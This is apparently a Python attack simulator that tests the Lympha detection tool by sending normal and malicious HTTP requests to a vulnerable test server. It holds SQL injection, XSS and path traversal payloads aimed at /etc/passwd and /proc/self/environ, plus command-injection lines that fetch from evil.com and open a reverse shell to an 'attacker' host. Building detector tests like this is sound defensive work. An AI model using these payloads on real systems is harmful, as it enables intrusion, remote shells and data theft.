"""
Attack simulator — generates traffic against the vuln_server to test Lympha.

Usage:
  python3 test/attack.py [target] [port]

Examples:
  python3 test/attack.py                        # http://localhost:8080
  python3 test/attack.py 192.168.1.100 80       # remote target
"""

import sys
import urllib.request
import urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
BASE = f"http://{TARGET}:{PORT}"
COUNT = 1


def req(method, path, body=None, headers=None):
    url = f"{BASE}{path}"
    if isinstance(body, bytes):
        data = body
    elif body:
        data = urllib.parse.urlencode(body).encode()
    else:
        data = None
    hdrs = headers or {}
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
    req_obj = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(req_obj, timeout=5)
        print(f"  {method:4s} {path:30s} -> {resp.status}")
        return resp
    except urllib.error.HTTPError as e:
        print(f"  {method:4s} {path:30s} -> {e.code}")
        return e


def section(title):
    print(f"\n── {title} ──")


# -- Normal traffic -----------------------------------------------------------

section("Normal traffic")

req("GET", "/")
req("GET", "/api/v2/user/profile", headers={"Authorization": "Bearer valid_token"})
req("POST", "/login", {"user": "alice", "pass": "s3cret"})
req("POST", "/api/v2/user/profile", {"email": "alice@test.com", "bio": "hello"})
req("GET", "/search?q=hello+world")
req("POST", "/exec", {"cmd": "whoami"})
req("POST", "/upload", headers={"X-Filename": "readme.txt"}, body=b"hello data")

# -- Suspicious traffic -------------------------------------------------------

section("SQL injection attempts")

for _ in range(COUNT):
    req("GET", '/search?q=1%27+OR+%271%27%3D%271')
    req("GET", '/search?q=' + urllib.parse.quote("' UNION SELECT * FROM users--"))
    req("GET", '/search?q=' + urllib.parse.quote("admin' --"))

section("Command injection")

for _ in range(COUNT):
    req("POST", "/exec", {"cmd": "; ls -la /etc"})
    req("POST", "/exec", {"cmd": "id; wget http://evil.com/payload"})
    req("POST", "/exec", {"cmd": "| bash -i >& /dev/tcp/attacker/4444 0>&1"})

section("Path traversal")

for _ in range(COUNT):
    req("GET", "/../../etc/passwd")
    req("GET", "/api/../../../proc/self/environ")

section("XSS attempts")

for _ in range(COUNT):
    req("GET", '/search?q=' + urllib.parse.quote("<script>alert('xss')</script>"))
    req("POST", "/api/v2/user/profile",
        {"email": "xss@test.com", "bio": "<img src=x onerror=alert(1)>"})

section("Brute-force login simulation")

for _ in range(COUNT * 5):
    req("POST", "/login", {"user": "admin", "pass": "wrong"})

section("Suspicious headers / recon")

req("GET", "/", headers={"User-Agent": "curl/7.88.1"})
req("GET", "/", headers={"User-Agent": "Go-http-client/2.0"})
req("GET", "/api/v2/user/profile", headers={"Authorization": "Bearer eyJ0eXAiOiJKV1Qi"})

print("\nDone.")
